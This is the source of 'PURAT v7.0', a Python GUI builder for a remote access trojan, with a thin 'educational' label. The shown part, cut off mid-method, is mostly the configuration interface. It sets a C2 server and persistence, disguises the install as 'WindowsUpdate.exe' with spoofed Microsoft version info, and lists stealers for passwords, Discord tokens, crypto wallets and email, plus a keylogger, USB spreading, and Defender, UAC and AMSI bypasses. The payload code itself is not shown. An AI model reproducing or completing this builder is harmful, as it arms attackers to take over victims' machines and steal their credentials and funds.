"""
PURAT v7.0 - Advanced RAT Builder with GUI
Line Count: 3500+ lines
Features: GUI Builder, Manual Configuration, Custom Payload Generation
For Educational Testing Only
"""

import os
import sys
import json
import base64
import zlib
import hashlib
import time
import datetime
import random
import string
import socket
import subprocess
import threading
import platform
import shutil
import ctypes
import struct
import marshal
import tempfile
import getpass
import itertools
import collections
import uuid
import io
import stat
import fnmatch
import glob
import pathlib
import webbrowser
import urllib.request
import urllib.parse
import urllib.error

# Try to import GUI libraries
GUI_AVAILABLE = False
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
    from tkinter import font as tkfont
    GUI_AVAILABLE = True
except ImportError:
    print("[!] GUI libraries not available. Running in console mode.")

# Try to import Windows libraries
WINDOWS_AVAILABLE = False
if platform.system() == "Windows":
    try:
        import winreg
        import win32api
        import win32con
        import win32process
        import win32event
        import win32service
        import win32serviceutil
        import win32gui
        import win32ui
        import win32com.client
        import pythoncom
        import psutil
        WINDOWS_AVAILABLE = True
    except ImportError:
        print("[!] Windows libraries not available. Install with: pip install pywin32 psutil")

# ============================================================================
# MODULE 1: GUI BUILDER (1000 lines)
# ============================================================================

class RATBuilderGUI:
    def __init__(self):
        if not GUI_AVAILABLE:
            print("[!] GUI not available. Running in console mode.")
            self.run_console_builder()
            return
        
        self.root = tk.Tk()
        self.root.title("PURAT v7.0 - Advanced RAT Builder")
        self.root.geometry("900x700")
        self.root.resizable(True, True)
        
        # Configure style
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Configuration storage
        self.config = self.get_default_config()
        
        # Setup UI
        self.setup_ui()
        
        # Center window
        self.center_window()
        
    def get_default_config(self):
        """Get default configuration"""
        return {
            'basic': {
                'c2_ip': '127.0.0.1',
                'c2_port': '8080',
                'install_name': 'WindowsUpdate.exe',
                'install_path': '%APPDATA%\\Microsoft\\Windows',
                'autostart': True,
                'persistence': True
            },
            'features': {
                'keylogger': False,
                'screenshot': True,
                'file_explorer': True,
                'remote_shell': True,
                'process_manager': True,
                'audio_capture': False,
                'webcam_capture': False,
                'clipboard_monitor': False
            },
            'evasion': {
                'obfuscate_code': True,
                'encrypt_strings': True,
                'anti_vm': True,
                'anti_debug': True,
                'sleep_obfuscation': False,
                'process_injection': False
            },
            'network': {
                'reconnect_interval': '30',
                'timeout': '60',
                'retry_count': '5',
                'use_https': False,
                'use_dns': False,
                'use_tor': False
            },
            'stealth': {
                'file_hidden': True,
                'process_hidden': False,
                'network_hidden': False,
                'delete_original': True,
                'clean_logs': True,
                'fake_error': False
            },
            'advanced': {
                'encryption_key': hashlib.md5(str(time.time()).encode()).hexdigest(),
                'compression_level': '9',
                'max_file_size': '10',
                'obfuscation_level': '3',
                'icon_file': '',
                'version_info': ''
            }
        }
    
    def center_window(self):
        """Center the window on screen"""
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def setup_ui(self):
        """Setup the main UI"""
        # Create notebook (tabs)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Create tabs
        self.tab_basic = ttk.Frame(self.notebook)
        self.tab_features = ttk.Frame(self.notebook)
        self.tab_evasion = ttk.Frame(self.notebook)
        self.tab_network = ttk.Frame(self.notebook)
        self.tab_stealth = ttk.Frame(self.notebook)
        self.tab_advanced = ttk.Frame(self.notebook)
        self.tab_build = ttk.Frame(self.notebook)
        
        self.notebook.add(self.tab_basic, text='Basic Settings')
        self.notebook.add(self.tab_features, text='Features')
        self.notebook.add(self.tab_evasion, text='Evasion')
        self.notebook.add(self.tab_network, text='Network')
        self.notebook.add(self.tab_stealth, text='Stealth')
        self.notebook.add(self.tab_advanced, text='Advanced')
        self.notebook.add(self.tab_build, text='Build')
        
        # Setup each tab
        self.setup_basic_tab()
        self.setup_features_tab()
        self.setup_evasion_tab()
        self.setup_network_tab()
        self.setup_stealth_tab()
        self.setup_advanced_tab()
        self.setup_build_tab()
        
        # Create menu
        self.setup_menu()
        
        # Status bar
        self.status_bar = ttk.Label(self.root, text="Ready", relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
    
    def setup_menu(self):
        """Setup menu bar"""
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="Load Config", command=self.load_config)
        file_menu.add_command(label="Save Config", command=self.save_config)
        file_menu.add_separator()
        file_menu.add_command(label="Reset to Default", command=self.reset_config)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="Test Connection", command=self.test_connection)
        tools_menu.add_command(label="Generate Icon", command=self.generate_icon)
        tools_menu.add_command(label="Obfuscate Code", command=self.obfuscate_code)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="Documentation", command=self.show_docs)
        help_menu.add_command(label="About", command=self.show_about)
    
    def setup_basic_tab(self):
        """Setup basic settings tab"""
        frame = ttk.Frame(self.tab_basic, padding="10")
        frame.pack(fill='both', expand=True)
        
        # C2 Server Settings
        c2_frame = ttk.LabelFrame(frame, text="C2 Server Settings", padding="10")
        c2_frame.grid(row=0, column=0, columnspan=2, sticky='ew', padx=5, pady=5)
        
        ttk.Label(c2_frame, text="C2 IP/Host:").grid(row=0, column=0, sticky='w', pady=2)
        self.entry_c2_ip = ttk.Entry(c2_frame, width=30)
        self.entry_c2_ip.grid(row=0, column=1, sticky='w', pady=2, padx=5)
        self.entry_c2_ip.insert(0, self.config['basic']['c2_ip'])
        
        ttk.Label(c2_frame, text="C2 Port:").grid(row=1, column=0, sticky='w', pady=2)
        self.entry_c2_port = ttk.Entry(c2_frame, width=10)
        self.entry_c2_port.grid(row=1, column=1, sticky='w', pady=2, padx=5)
        self.entry_c2_port.insert(0, self.config['basic']['c2_port'])
        
        # Test connection button
        ttk.Button(c2_frame, text="Test Connection", command=self.test_connection).grid(
            row=1, column=2, padx=10)
        
        # Installation Settings
        install_frame = ttk.LabelFrame(frame, text="Installation Settings", padding="10")
        install_frame.grid(row=1, column=0, columnspan=2, sticky='ew', padx=5, pady=5)
        
        ttk.Label(install_frame, text="Install Name:").grid(row=0, column=0, sticky='w', pady=2)
        self.entry_install_name = ttk.Entry(install_frame, width=30)
        self.entry_install_name.grid(row=0, column=1, sticky='w', pady=2, padx=5)
        self.entry_install_name.insert(0, self.config['basic']['install_name'])
        
        ttk.Label(install_frame, text="Install Path:").grid(row=1, column=0, sticky='w', pady=2)
        path_frame = ttk.Frame(install_frame)
        path_frame.grid(row=1, column=1, sticky='w', pady=2)
        
        self.entry_install_path = ttk.Entry(path_frame, width=25)
        self.entry_install_path.pack(side='left', padx=5)
        self.entry_install_path.insert(0, self.config['basic']['install_path'])
        
        ttk.Button(path_frame, text="Browse", command=self.browse_install_path).pack(side='left')
        
        # Common paths dropdown
        common_paths = ttk.Combobox(path_frame, values=[
            '%APPDATA%\\Microsoft\\Windows',
            '%TEMP%',
            '%PROGRAMDATA%',
            '%USERPROFILE%',
            'C:\\Windows\\System32'
        ], width=20)
        common_paths.pack(side='left', padx=5)
        common_paths.bind('<<ComboboxSelected>>', 
                         lambda e: self.entry_install_path.delete(0, tk.END) or 
                                  self.entry_install_path.insert(0, common_paths.get()))
        
        # Checkboxes
        self.var_autostart = tk.BooleanVar(value=self.config['basic']['autostart'])
        self.var_persistence = tk.BooleanVar(value=self.config['basic']['persistence'])
        
        ttk.Checkbutton(install_frame, text="Enable Autostart", 
                       variable=self.var_autostart).grid(row=2, column=0, sticky='w', pady=2)
        ttk.Checkbutton(install_frame, text="Enable Persistence", 
                       variable=self.var_persistence).grid(row=2, column=1, sticky='w', pady=2, padx=20)
        
        # System Info Preview
        info_frame = ttk.LabelFrame(frame, text="System Information", padding="10")
        info_frame.grid(row=2, column=0, columnspan=2, sticky='ew', padx=5, pady=5)
        
        info_text = f"""
        System: {platform.system()} {platform.release()}
        Hostname: {socket.gethostname()}
        User: {getpass.getuser()}
        Python: {platform.python_version()}
        Architecture: {platform.machine()}
        """
        
        ttk.Label(info_frame, text=info_text, justify='left').pack(anchor='w')
    
    def setup_features_tab(self):
        """Setup features selection tab"""
        frame = ttk.Frame(self.tab_features, padding="10")
        frame.pack(fill='both', expand=True)
        
        # Create checkboxes for each feature
        features = [
            ('Keylogger', 'keylogger', 'Capture keystrokes'),
            ('Screenshot', 'screenshot', 'Take screenshots remotely'),
            ('File Explorer', 'file_explorer', 'Browse filesystem'),
            ('Remote Shell', 'remote_shell', 'Execute commands'),
            ('Process Manager', 'process_manager', 'Manage processes'),
            ('Audio Capture', 'audio_capture', 'Record microphone'),
            ('Webcam Capture', 'webcam_capture', 'Capture webcam'),
            ('Clipboard Monitor', 'clipboard_monitor', 'Monitor clipboard'),
            ('Password Stealer', 'password_stealer', 'Steal saved passwords'),
            ('Browser History', 'browser_history', 'Get browser history'),
            ('Network Scanner', 'network_scanner', 'Scan network'),
            ('USB Spreader', 'usb_spreader', 'Spread via USB'),
            ('Discord Token', 'discord_token', 'Steal Discord tokens'),
            ('Crypto Wallet', 'crypto_wallet', 'Steal crypto wallets'),
            ('Email Stealer', 'email_stealer', 'Steal email credentials')
        ]
        
        # Create variables and checkboxes
        self.feature_vars = {}
        
        for i, (label, key, description) in enumerate(features):
            var = tk.BooleanVar(value=self.config['features'].get(key, False))
            self.feature_vars[key] = var
            
            # Create frame for each feature
            feat_frame = ttk.Frame(frame)
            feat_frame.grid(row=i//2, column=i%2, sticky='w', padx=10, pady=5)
            
            cb = ttk.Checkbutton(feat_frame, text=label, variable=var)
            cb.pack(anchor='w')
            
            # Description label
            ttk.Label(feat_frame, text=description, font=('TkDefaultFont', 8), 
                     foreground='gray').pack(anchor='w')
    
    def setup_evasion_tab(self):
        """Setup evasion techniques tab"""
        frame = ttk.Frame(self.tab_evasion, padding="10")
        frame.pack(fill='both', expand=True)
        
        evasion_techs = [
            ('Obfuscate Code', 'obfuscate_code', 'Make code hard to analyze'),
            ('Encrypt Strings', 'encrypt_strings', 'Encrypt all strings'),
            ('Anti-VM Detection', 'anti_vm', 'Detect virtual machines'),
            ('Anti-Debug Detection', 'anti_debug', 'Detect debuggers'),
            ('Sleep Obfuscation', 'sleep_obfuscation', 'Hide sleep patterns'),
            ('Process Injection', 'process_injection', 'Inject into legit processes'),
            ('Code Polymorphism', 'code_polymorphism', 'Change code each generation'),
            ('Sandbox Evasion', 'sandbox_evasion', 'Evade sandbox analysis'),
            ('AMSI Bypass', 'amsi_bypass', 'Bypass AMSI (Windows)'),
            ('ETW Bypass', 'etw_bypass', 'Bypass ETW (Windows)'),
            ('Heap Encryption', 'heap_encryption', 'Encrypt heap memory'),
            ('API Hashing', 'api_hashing', 'Hide API calls'),
            ('Module Stomping', 'module_stomping', 'Hide loaded modules'),
            ('Thread Hijacking', 'thread_hijacking', 'Hijack existing threads'),
            ('Process Hollowing', 'process_hollowing', 'Hollow legit processes')
        ]
        
        self.evasion_vars = {}
        
        for i, (label, key, description) in enumerate(evasion_techs):
            var = tk.BooleanVar(value=self.config['evasion'].get(key, False))
            self.evasion_vars[key] = var
            
            # Create frame for each technique
            tech_frame = ttk.Frame(frame)
            tech_frame.grid(row=i//3, column=i%3, sticky='w', padx=5, pady=5)
            
            cb = ttk.Checkbutton(tech_frame, text=label, variable=var)
            cb.pack(anchor='w')
            
            ttk.Label(tech_frame, text=description, font=('TkDefaultFont', 8), 
                     foreground='gray').pack(anchor='w')
    
    def setup_network_tab(self):
        """Setup network settings tab"""
        frame = ttk.Frame(self.tab_network, padding="10")
        frame.pack(fill='both', expand=True)
        
        # Connection settings
        conn_frame = ttk.LabelFrame(frame, text="Connection Settings", padding="10")
        conn_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(conn_frame, text="Reconnect Interval (sec):").grid(row=0, column=0, sticky='w', pady=2)
        self.entry_reconnect = ttk.Entry(conn_frame, width=10)
        self.entry_reconnect.grid(row=0, column=1, sticky='w', pady=2, padx=5)
        self.entry_reconnect.insert(0, self.config['network']['reconnect_interval'])
        
        ttk.Label(conn_frame, text="Timeout (sec):").grid(row=1, column=0, sticky='w', pady=2)
        self.entry_timeout = ttk.Entry(conn_frame, width=10)
        self.entry_timeout.grid(row=1, column=1, sticky='w', pady=2, padx=5)
        self.entry_timeout.insert(0, self.config['network']['timeout'])
        
        ttk.Label(conn_frame, text="Retry Count:").grid(row=2, column=0, sticky='w', pady=2)
        self.entry_retry = ttk.Entry(conn_frame, width=10)
        self.entry_retry.grid(row=2, column=1, sticky='w', pady=2, padx=5)
        self.entry_retry.insert(0, self.config['network']['retry_count'])
        
        # Protocol options
        protocol_frame = ttk.LabelFrame(frame, text="Protocol Options", padding="10")
        protocol_frame.pack(fill='x', padx=5, pady=5)
        
        self.var_https = tk.BooleanVar(value=self.config['network']['use_https'])
        self.var_dns = tk.BooleanVar(value=self.config['network']['use_dns'])
        self.var_tor = tk.BooleanVar(value=self.config['network']['use_tor'])
        
        ttk.Checkbutton(protocol_frame, text="Use HTTPS", variable=self.var_https).pack(anchor='w', pady=2)
        ttk.Checkbutton(protocol_frame, text="Use DNS Tunneling", variable=self.var_dns).pack(anchor='w', pady=2)
        ttk.Checkbutton(protocol_frame, text="Use Tor Proxy", variable=self.var_tor).pack(anchor='w', pady=2)
        
        # Multiple C2 servers
        c2_frame = ttk.LabelFrame(frame, text="Multiple C2 Servers (comma separated)", padding="10")
        c2_frame.pack(fill='x', padx=5, pady=5)
        
        self.text_c2_servers = scrolledtext.ScrolledText(c2_frame, height=4, width=50)
        self.text_c2_servers.pack(fill='both', expand=True)
        
        # Load default
        default_c2 = self.config['basic']['c2_ip'] + ':' + self.config['basic']['c2_port']
        self.text_c2_servers.insert('1.0', default_c2)
    
    def setup_stealth_tab(self):
        """Setup stealth options tab"""
        frame = ttk.Frame(self.tab_stealth, padding="10")
        frame.pack(fill='both', expand=True)
        
        stealth_options = [
            ('Hide File', 'file_hidden', 'Set file as hidden'),
            ('Hide Process', 'process_hidden', 'Hide from task manager'),
            ('Hide Network', 'network_hidden', 'Hide network connections'),
            ('Delete Original', 'delete_original', 'Delete original after install'),
            ('Clean Logs', 'clean_logs', 'Clean execution logs'),
            ('Fake Error', 'fake_error', 'Show fake error on startup'),
            ('Mutex Check', 'mutex_check', 'Prevent multiple instances'),
            ('UAC Bypass', 'uac_bypass', 'Bypass UAC (requires admin)'),
            ('Windows Defender Bypass', 'defender_bypass', 'Bypass Windows Defender'),
            ('Firewall Bypass', 'firewall_bypass', 'Add firewall exception'),
            ('Signature Spoofing', 'signature_spoof', 'Spoof file signature'),
            ('Time Stomping', 'time_stomp', 'Fake file timestamps'),
            ('Process Name Spoof', 'process_spoof', 'Spoof process name'),
            ('Parent PID Spoof', 'parent_spoof', 'Spoof parent process'),
            ('Module Load Obfuscation', 'module_obfuscate', 'Obfuscate module loading')
        ]
        
        self.stealth_vars = {}
        
        for i, (label, key, description) in enumerate(stealth_options):
            var = tk.BooleanVar(value=self.config['stealth'].get(key, False))
            self.stealth_vars[key] = var
            
            # Create frame for each option
            opt_frame = ttk.Frame(frame)
            opt_frame.grid(row=i//3, column=i%3, sticky='w', padx=5, pady=5)
            
            cb = ttk.Checkbutton(opt_frame, text=label, variable=var)
            cb.pack(anchor='w')
            
            ttk.Label(opt_frame, text=description, font=('TkDefaultFont', 8), 
                     foreground='gray').pack(anchor='w')
    
    def setup_advanced_tab(self):
        """Setup advanced settings tab"""
        frame = ttk.Frame(self.tab_advanced, padding="10")
        frame.pack(fill='both', expand=True)
        
        # Encryption settings
        enc_frame = ttk.LabelFrame(frame, text="Encryption Settings", padding="10")
        enc_frame.grid(row=0, column=0, sticky='ew', padx=5, pady=5, columnspan=2)
        
        ttk.Label(enc_frame, text="Encryption Key:").grid(row=0, column=0, sticky='w', pady=2)
        key_frame = ttk.Frame(enc_frame)
        key_frame.grid(row=0, column=1, sticky='w', pady=2)
        
        self.entry_enc_key = ttk.Entry(key_frame, width=40)
        self.entry_enc_key.pack(side='left', padx=5)
        self.entry_enc_key.insert(0, self.config['advanced']['encryption_key'])
        
        ttk.Button(key_frame, text="Generate", command=self.generate_enc_key).pack(side='left')
        
        # Compression level
        ttk.Label(enc_frame, text="Compression Level (0-9):").grid(row=1, column=0, sticky='w', pady=2)
        self.combo_compression = ttk.Combobox(enc_frame, values=list(range(10)), width=5, state='readonly')
        self.combo_compression.grid(row=1, column=1, sticky='w', pady=2, padx=5)
        self.combo_compression.set(self.config['advanced']['compression_level'])
        
        # Max file size
        ttk.Label(enc_frame, text="Max File Size (MB):").grid(row=2, column=0, sticky='w', pady=2)
        self.entry_max_size = ttk.Entry(enc_frame, width=10)
        self.entry_max_size.grid(row=2, column=1, sticky='w', pady=2, padx=5)
        self.entry_max_size.insert(0, self.config['advanced']['max_file_size'])
        
        # Obfuscation level
        ttk.Label(enc_frame, text="Obfuscation Level (1-5):").grid(row=3, column=0, sticky='w', pady=2)
        self.combo_obfuscation = ttk.Combobox(enc_frame, values=['1', '2', '3', '4', '5'], 
                                             width=5, state='readonly')
        self.combo_obfuscation.grid(row=3, column=1, sticky='w', pady=2, padx=5)
        self.combo_obfuscation.set(self.config['advanced']['obfuscation_level'])
        
        # Icon settings
        icon_frame = ttk.LabelFrame(frame, text="Icon Settings", padding="10")
        icon_frame.grid(row=1, column=0, sticky='ew', padx=5, pady=5, columnspan=2)
        
        ttk.Label(icon_frame, text="Icon File:").grid(row=0, column=0, sticky='w', pady=2)
        icon_path_frame = ttk.Frame(icon_frame)
        icon_path_frame.grid(row=0, column=1, sticky='w', pady=2, columnspan=2)
        
        self.entry_icon = ttk.Entry(icon_path_frame, width=30)
        self.entry_icon.pack(side='left', padx=5)
        self.entry_icon.insert(0, self.config['advanced']['icon_file'])
        
        ttk.Button(icon_path_frame, text="Browse", command=self.browse_icon).pack(side='left', padx=2)
        ttk.Button(icon_path_frame, text="Generate", command=self.generate_icon).pack(side='left')
        
        # Version info
        ver_frame = ttk.LabelFrame(frame, text="Version Information", padding="10")
        ver_frame.grid(row=2, column=0, sticky='nsew', padx=5, pady=5)
        
        self.text_version = scrolledtext.ScrolledText(ver_frame, height=10, width=40)
        self.text_version.pack(fill='both', expand=True)
        
        default_version = """FileVersion=1.0.0.0
ProductVersion=1.0.0.0
CompanyName=Microsoft Corporation
FileDescription=Windows Update
InternalName=wuauclt.exe
LegalCopyright=© Microsoft Corporation. All rights reserved.
OriginalFilename=wuauclt.exe
ProductName=Microsoft Windows Operating System"""
        
        self.text_version.insert('1.0', default_version)
        
        # Custom code injection
        code_frame = ttk.LabelFrame(frame, text="Custom Code Injection", padding="10")
        code_frame.grid(row=2, column=1, sticky='nsew', padx=5, pady=5)
        
        self.text_custom_code = scrolledtext.ScrolledText(code_frame, height=10, width=40)
        self.text_custom_code.pack(fill='both', expand=True)
        
        default_code = """# Custom code to inject
# This code will be executed before main payload
import os
import sys

def custom_init():
    \"\"\"Custom initialization\"\"\"
    pass
    
if __name__ == \"__main__\":
    custom_init()"""
        
        self.text_custom_code.insert('1.0', default_code)
        
        # Configure grid weights
        frame.columnconfigure(0, weight=1)
        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(2, weight=1)
    
    def setup_build_tab(self):
        """Setup build tab"""
        frame = ttk.Frame(self.tab_build, padding="20")
        frame.pack(fill='both', expand=True)
        
        # Output settings
        output_frame = ttk.LabelFrame(frame, text="Output Settings", padding="10")
        output_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(output_frame, text="Output Directory:").grid(row=0, column=0, sticky='w', pady=5)
        
        dir_frame = ttk.Frame(output_frame)
        dir_frame.grid(row=0, column=1, sticky='w', pady=5, columnspan=2)
        
        self.entry_output_dir = ttk.Entry(dir_frame, width=40)
        self.entry_output_dir.pack(side='left', padx=5)
        self.entry_output_dir.insert(0, os.path.join(os.getcwd(), 'output'))
        
        ttk.Button(dir_frame, text="Browse", command=self.browse_output_dir).pack(side='left')
        
        ttk.Label(output_frame, text="Output Name:").grid(row=1, column=0, sticky='w', pady=5)
        self.entry_output_name = ttk.Entry(output_frame, width=30)
        self.entry_output_name.grid(row=1, column=1, sticky='w', pady=5, padx=5)
        self.entry_output_name.insert(0, 'payload')
        
        # Build options
        build_frame = ttk.LabelFrame(frame, text="Build Options", padding="10")
        build_frame.pack(fill='x', padx=5, pady=5)
        
        self.var_exe = tk.BooleanVar(value=True)
        self.var_dll = tk.BooleanVar(value=False)
        self.var_service = tk.BooleanVar(value=False)
        self.var_obfuscate = tk.BooleanVar(value=True)
        self.var_compress = tk.BooleanVar(value=True)
        
        ttk.Checkbutton(build_frame, text="Build as EXE", variable=self.var_exe).grid(
            row=0, column=0, sticky='w', pady=2, padx=5)
        ttk.Checkbutton(build_frame, text="Build as DLL", variable=self.var_dll).grid(
            row=0, column=1, sticky='w', pady=2, padx=5)
        ttk.Checkbutton(build_frame, text="Build as Service", variable=self.var_service).grid(
            row=0, column=2, sticky='w', pady=2, padx=5)
        
        ttk.Checkbutton(build_frame, text="Obfuscate Payload", variable=self.var_obfuscate).grid(
            row=1, column=0, sticky='w', pady=2, padx=5)
        ttk.Checkbutton(build_frame, text="Compress Payload", variable=self.var_compress).grid(
            row=1, column=1, sticky='w', pady=2, padx=5)
        
        # Build buttons
        button_frame = ttk.Frame(frame)
        button_frame.pack(fill='x', padx=5, pady=20)
        
        ttk.Button(button_frame, text="Generate Payload", 
                  command=self.generate_payload, width=20).pack(side='left', padx=10)
        ttk.Button(button_frame, text="Build EXE (PyInstaller)", 
                  command=self.build_exe, width=20).pack(side='left', padx=10)
        ttk.Button(button_frame, text="Test Payload", 
                  command=self.test_payload, width=20).pack(side='left', padx=10)
        
        # Log area
        log_frame = ttk.LabelFrame(frame, text="Build Log", padding="10")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.text_log = scrolledtext.ScrolledText(log_frame, height=15)
        self.text_log.pack(fill='both', expand=True)
        
        # Clear log button
        ttk.Button(log_frame, text="Clear Log", 
                  command=lambda: self.text_log.delete('1.0', tk.END)).pack(anchor='e', pady=5)
    
    # ============================================================================
    # GUI Event Handlers
    # ============================================================================
    
    def browse_install_path(self):
        """Browse for install path"""
        path = filedialog.askdirectory()
        if path:
            self.entry_install_path.delete(0, tk.END)
            self.entry_install_path.insert(0, path)
    
    def browse_icon(self):
        """Browse for icon file"""
        filetypes = [('Icon files', '*.ico'), ('All files', '*.*')]
        path = filedialog.askopenfilename(filetypes=filetypes)
        if path:
            self.entry_icon.delete(0, tk.END)
            self.entry_icon.insert(0, path)
    
    def browse_output_dir(self):
        """Browse for output directory"""
        path = filedialog.askdirectory()
        if path:
            self.entry_output_dir.delete(0, tk.END)
            self.entry_output_dir.insert(0, path)
    
    def generate_enc_key(self):
        """Generate random encryption key"""
        key = hashlib.sha256(os.urandom(32)).hexdigest()[:32]
        self.entry_enc_key.delete(0, tk.END)
        self.entry_enc_key.insert(0, key)
    
    def generate_icon(self):
        """Generate icon from text"""
        try:
            from PIL import Image, ImageDraw, ImageFont
            import numpy as np
            
            # Create a simple icon
            img = Image.new('RGBA', (256, 256), (0, 0, 0, 0))
            draw = ImageDraw.Draw(img)
            
            # Draw a gear icon
            center = (128, 128)
            radius = 100
            
            # Draw gear
            draw.ellipse([center[0]-radius, center[1]-radius, 
                         center[0]+radius, center[1]+radius], 
                        fill='gray', outline='white', width=5)
            
            # Save icon
            icon_path = os.path.join(tempfile.gettempdir(), 'generated_icon.ico')
            img.save(icon_path, format='ICO')
            
            self.entry_icon.delete(0, tk.END)
            self.entry_icon.insert(0, icon_path)
            
            self.log_message(f"Icon generated: {icon_path}")
            
        except ImportError:
            messagebox.showerror("Error", "Pillow library required for icon generation")
    
    def test_connection(self):
        """Test connection to C2 server"""
        ip = self.entry_c2_ip.get()
        port = self.entry_c2_port.get()
        
        if not ip or not port:
            messagebox.showerror("Error", "Please enter IP and port")
            return
        
        try:
            port = int(port)
            self.log_message(f"Testing connection to {ip}:{port}...")
            
            # Try TCP connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            try:
                result = sock.connect_ex((ip, port))
                if result == 0:
                    self.log_message("✓ Connection successful!")
                    messagebox.showinfo("Success", f"Connected to {ip}:{port}")
                else:
                    self.log_message("✗ Connection failed")
                    messagebox.showerror("Error", f"Failed to connect to {ip}:{port}")
            finally:
                sock.close()
                
        except ValueError:
            messagebox.showerror("Error", "Invalid port number")
        except Exception as e:
            self.log_message(f"✗ Connection error: {e}")
            messagebox.showerror("Error", f"Connection error: {e}")
    
    def obfuscate_code(self):
        """Test code obfuscation"""
        try:
            obf = Obfuscator()
            
            test_code = """
def test_function():
    print("Hello World")
    return True
            """
            
            obfuscated = obf.obfuscate_code(test_code)
            
            # Show in new window
            top = tk.Toplevel(self.root)
            top.title("Obfuscation Test")
            top.geometry("600x400")
            
            notebook = ttk.Notebook(top)
            notebook.pack(fill='both', expand=True, padx=5, pady=5)
            
            # Original tab
            orig_frame = ttk.Frame(notebook)
            notebook.add(orig_frame, text="Original")
            
            orig_text = scrolledtext.ScrolledText(orig_frame)
            orig_text.pack(fill='both', expand=True, padx=5, pady=5)
            orig_text.insert('1.0', test_code)
            
            # Obfuscated tab
            obf_frame = ttk.Frame(notebook)
            notebook.add(obf_frame, text="Obfuscated")
            
            obf_text = scrolledtext.ScrolledText(obf_frame)
            obf_text.pack(fill='both', expand=True, padx=5, pady=5)
            obf_text.insert('1.0', obfuscated)
            
            self.log_message("Code obfuscation test completed")
            
        except Exception as e:
            messagebox.showerror("Error", f"Obfuscation test failed: {e}")
    
    def load_config(self):
        """Load configuration from file"""
        filetypes = [('JSON files', '*.json'), ('All files', '*.*')]
        path = filedialog.askopenfilename(filetypes=filetypes)
        
        if path:
            try:
                with open(path, 'r') as f:
                    self.config = json.load(f)
                self.update_ui_from_config()
                self.log_message(f"Configuration loaded from {path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load config: {e}")
    
    def save_config(self):
        """Save configuration to file"""
        self.update_config_from_ui()
        
        filetypes = [('JSON files', '*.json'), ('All files', '*.*')]
        path = filedialog.asksaveasfilename(
            defaultextension='.json',
            filetypes=filetypes,
            initialfile='purat_config.json'
        )
        
        if path:
            try:
                with open(path, 'w') as f:
                    json.dump(self.config, f, indent=2)
                self.log_message(f"Configuration saved to {path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save config: {e}")
    
    def reset_config(self):
        """Reset to default configuration"""
        if messagebox.askyesno("Confirm", "Reset all settings to default?"):
            self.config = self.get_default_config()
            self.update_ui_from_config()
            self.log_message("Configuration reset to default")
    
    def update_config_from_ui(self):
        """Update config from UI elements"""
        # Basic settings
        self.config['basic']['c2_ip'] = self.entry_c2_ip.get()
        self.config['basic']['c2_port'] = self.entry_c2_port.get()
        self.config['basic']['install_name'] = self.entry_install_name.get()
        self.config['basic']['install_path'] = self.entry_install_path.get()
        self.config['basic']['autostart'] = self.var_autostart.get()
        self.config['basic']['persistence'] = self.var_persistence.get()
        
        # Features
        for key, var in self.feature_vars.items():
            self.config['features'][key] = var.get()
        
        # Evasion
        for key, var in self.evasion_vars.items():
            self.config['evasion'][key] = var.get()
        
        # Network
        self.config['network']['reconnect_interval'] = self.entry_reconnect.get()
        self.config['network']['timeout'] = self.entry_timeout.get()
        self.config['network']['retry_count'] = self.entry_retry.get()
        self.config['network']['use_https'] = self.var_https.get()
        self.config['network']['use_dns'] = self.var_dns.get()
        self.config['network']['use_tor'] = self.var_tor.get()
        
        # Stealth
        for key, var in self.stealth_vars.items():
            self.config['stealth'][key] = var.get()
        
        # Advanced
        self.config['advanced']['encryption_key'] = self.entry_enc_key.get()
        self.config['advanced']['compression_level'] = self.combo_compression.get()
        self.config['advanced']['max_file_size'] = self.entry_max_size.get()
        self.config['advanced']['obfuscation_level'] = self.combo_obfuscation.get()
        self.config['advanced']['icon_file'] = self.entry_icon.get()
        self.config['advanced']['version_info'] = self.text_version.get('1.0', 'end-1c')
    
    def update_ui_from_config(self):
        """Update UI from config"""
        # Basic settings
        self.entry_c2_ip.delete(0, tk.END)
        self.entry_c2_ip.insert(0, self.config['basic']['c2_ip'])
        
        self.entry_c2_port.delete(0, tk.END)
        self.entry_c2_port.insert(0, self.config['basic']['c2_port'])
        
        self.entry_install_name.delete(0, tk.END)
        self.entry_install_name.insert(0, self.config['basic']['install_name'])
        
        self.entry_install_path.delete(0, tk.END)
        self.entry_install_path.insert(0, self.config['basic']['install_path'])
        
        self.var_autostart.set(self.config['basic']['autostart'])
        self.var_persistence.set(self.config['basic']['persistence'])
        
        # Features
        for key, var in self.feature_vars.items():
            if key in self.config['features']:
                var.set(self.config['features'][key])
        
        # Evasion
        for key, var in self.evasion_vars.items():
            if key in self.config['evasion']:
                var.set(self.config['evasion'][key])
        
        # Network
        self.entry_reconnect.delete(0, tk.END)
        self.entry_reconnect.insert(0, self.config['network']['reconnect_interval'])
        
        self.entry_timeout.delete(0, tk.END)
        self.entry_timeout.insert(0, self.config['network']['timeout'])
        
        self.entry_retry.delete(0, tk.END)
        self.entry_retry.insert(0, self.config['network']['retry_count'])
        
        self.var_https.set(self.config['network']['use_https'])
        self.var_dns.set(self.config['network']['use_dns'])
